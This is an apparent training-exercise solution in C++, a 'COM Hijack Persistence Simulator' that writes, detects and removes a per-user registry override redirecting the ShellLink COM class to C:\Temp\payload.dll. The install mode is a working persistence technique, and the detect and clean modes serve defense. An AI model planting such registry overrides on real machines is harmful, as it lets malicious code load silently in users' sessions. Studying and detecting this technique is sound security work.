/*
  Solution 01 — COM Hijack Persistence Simulator
  ================================================
  Demonstrates COM hijacking via HKCU\SOFTWARE\Classes\CLSID overrides.

  Usage:
    sol01.exe install  — write HKCU override for ShellLink CLSID
    sol01.exe detect   — scan all HKCU CLSID overrides vs HKCR values
    sol01.exe clean    — remove the demo override

  Target CLSID: {7C857801-7381-11CF-884D-00AA004B2E24}  (ShellLink — safe demo)

  Compile:
    g++ -std=c++17 -Wall -o sol01.exe sol01_com_hijack.cpp -ladvapi32
*/

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <iomanip>

// ── demo constants ────────────────────────────────────────────────────────────
static const char* DEMO_CLSID   = "{7C857801-7381-11CF-884D-00AA004B2E24}";
static const char* PAYLOAD_PATH = "C:\\Temp\\payload.dll";

// ─────────────────────────────────────────────────────────────────────────────
// Print a Win32 error message
// ─────────────────────────────────────────────────────────────────────────────
static void printError(const char* label, LONG rc) {
    char msg[512] = {};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   nullptr, (DWORD)rc, 0, msg, sizeof(msg), nullptr);
    // trim trailing newlines
    for (int i = (int)strlen(msg) - 1; i >= 0 && (msg[i] == '\r' || msg[i] == '\n'); --i)
        msg[i] = '\0';
    std::cerr << "    ERROR [" << label << "] rc=" << rc << ": " << msg << "\n";
}

// ─────────────────────────────────────────────────────────────────────────────
// Read a REG_SZ default value ("") from root\subkey
// ─────────────────────────────────────────────────────────────────────────────
static std::string readRegSZ(HKEY root, const std::string& subkey) {
    HKEY  hk   = nullptr;
    LONG  rc   = RegOpenKeyExA(root, subkey.c_str(), 0, KEY_READ, &hk);
    if (rc != ERROR_SUCCESS) return "";

    char  buf[512] = {};
    DWORD type     = REG_SZ;
    DWORD size     = sizeof(buf);
    rc = RegQueryValueExA(hk, "", nullptr, &type,
                          reinterpret_cast<LPBYTE>(buf), &size);
    RegCloseKey(hk);
    return (rc == ERROR_SUCCESS) ? std::string(buf) : "";
}

// ─────────────────────────────────────────────────────────────────────────────
// Enumerate child key names under root\subkey
// ─────────────────────────────────────────────────────────────────────────────
static std::vector<std::string> enumSubkeys(HKEY root, const std::string& subkey) {
    std::vector<std::string> keys;
    HKEY hk = nullptr;
    if (RegOpenKeyExA(root, subkey.c_str(), 0, KEY_ENUMERATE_SUB_KEYS, &hk) != ERROR_SUCCESS)
        return keys;

    char   name[256];
    DWORD  idx = 0;
    DWORD  nameLen;
    LONG   rc;
    while (true) {
        nameLen = sizeof(name);
        rc = RegEnumKeyExA(hk, idx++, name, &nameLen,
                           nullptr, nullptr, nullptr, nullptr);
        if (rc == ERROR_NO_MORE_ITEMS) break;
        if (rc == ERROR_SUCCESS) keys.emplace_back(name, nameLen);
    }
    RegCloseKey(hk);
    return keys;
}

// ─────────────────────────────────────────────────────────────────────────────
// MODE: install
// ─────────────────────────────────────────────────────────────────────────────
static int modeInstall() {
    std::cout << "[install] Writing HKCU override for " << DEMO_CLSID << "\n\n";

    // Show before state
    std::string hkcrPath = std::string("CLSID\\") + DEMO_CLSID + "\\InprocServer32";
    std::string hkcuPath = std::string("SOFTWARE\\Classes\\CLSID\\") + DEMO_CLSID + "\\InprocServer32";

    std::string before_hkcr = readRegSZ(HKEY_CLASSES_ROOT,   hkcrPath);
    std::string before_hkcu = readRegSZ(HKEY_CURRENT_USER,   hkcuPath);

    std::cout << "Before:\n"
              << "  HKCR: " << (before_hkcr.empty() ? "(not set)" : before_hkcr) << "\n"
              << "  HKCU: " << (before_hkcu.empty() ? "(not set)" : before_hkcu) << "\n\n";

    // Write the override
    HKEY  hk = nullptr;
    LONG  rc = RegCreateKeyExA(HKEY_CURRENT_USER, hkcuPath.c_str(),
                               0, nullptr, REG_OPTION_NON_VOLATILE,
                               KEY_SET_VALUE, nullptr, &hk, nullptr);
    if (rc != ERROR_SUCCESS) {
        printError("RegCreateKeyExA", rc);
        return 1;
    }

    rc = RegSetValueExA(hk, "", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(PAYLOAD_PATH),
                        static_cast<DWORD>(strlen(PAYLOAD_PATH) + 1));
    RegCloseKey(hk);

    if (rc != ERROR_SUCCESS) {
        printError("RegSetValueExA", rc);
        return 1;
    }

    // Show after state
    std::string after_hkcu = readRegSZ(HKEY_CURRENT_USER, hkcuPath);
    std::cout << "After:\n"
              << "  HKCR: " << (before_hkcr.empty() ? "(not set)" : before_hkcr) << "\n"
              << "  HKCU: " << (after_hkcu.empty() ? "(not set)" : after_hkcu) << "\n\n"
              << "[+] HKCU override written. Windows will load HKCU value at activation.\n";
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// MODE: detect
// Scan all CLSIDs under HKCU\SOFTWARE\Classes\CLSID.
// For each one, compare its InprocServer32 with HKCR.
// ─────────────────────────────────────────────────────────────────────────────
static int modeDetect() {
    std::cout << "[detect] Scanning HKCU\\SOFTWARE\\Classes\\CLSID for overrides ...\n\n";

    auto clsids = enumSubkeys(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\CLSID");
    if (clsids.empty()) {
        std::cout << "  No CLSIDs found in HKCU.\n";
        return 0;
    }

    std::cout << std::left
              << std::setw(42) << "CLSID"
              << std::setw(40) << "HKCU (override)"
              << "HKCR (original)\n";
    std::cout << std::string(100, '-') << "\n";

    int found = 0;
    for (const auto& clsid : clsids) {
        std::string hkcuSub = "SOFTWARE\\Classes\\CLSID\\" + clsid + "\\InprocServer32";
        std::string hkcrSub = "CLSID\\" + clsid + "\\InprocServer32";

        std::string hkcu_val = readRegSZ(HKEY_CURRENT_USER,  hkcuSub);
        std::string hkcr_val = readRegSZ(HKEY_CLASSES_ROOT,  hkcrSub);

        if (hkcu_val.empty()) continue; // no InprocServer32 override

        ++found;
        std::string marker = (hkcu_val != hkcr_val) ? " [DELTA]" : " [same]";
        std::cout << std::setw(42) << clsid
                  << std::setw(40) << (hkcu_val.size() > 38 ? hkcu_val.substr(0,35)+"..." : hkcu_val)
                  << (hkcr_val.empty() ? "(not in HKCR)" : hkcr_val)
                  << marker << "\n";
    }

    std::cout << "\n" << found << " CLSID override(s) with InprocServer32 found.\n";
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// MODE: clean
// ─────────────────────────────────────────────────────────────────────────────
static int modeClean() {
    std::cout << "[clean] Removing HKCU override for " << DEMO_CLSID << " ...\n";

    std::string keyPath = std::string("SOFTWARE\\Classes\\CLSID\\") + DEMO_CLSID;
    LONG rc = RegDeleteTreeA(HKEY_CURRENT_USER, keyPath.c_str());
    if (rc == ERROR_SUCCESS) {
        std::cout << "[+] Key removed: HKCU\\" << keyPath << "\n";
        return 0;
    } else if (rc == ERROR_FILE_NOT_FOUND) {
        std::cout << "[-] Key not found — nothing to clean.\n";
        return 0;
    } else {
        printError("RegDeleteTreeA", rc);
        return 1;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    std::cout << "=== Solution 01: COM Hijack Persistence Simulator ===\n\n";

    if (argc < 2) {
        std::cerr << "Usage: sol01.exe <install|detect|clean>\n";
        return 1;
    }

    std::string mode = argv[1];
    if      (mode == "install") return modeInstall();
    else if (mode == "detect")  return modeDetect();
    else if (mode == "clean")   return modeClean();
    else {
        std::cerr << "Unknown mode '" << mode << "'. Use: install | detect | clean\n";
        return 1;
    }
}
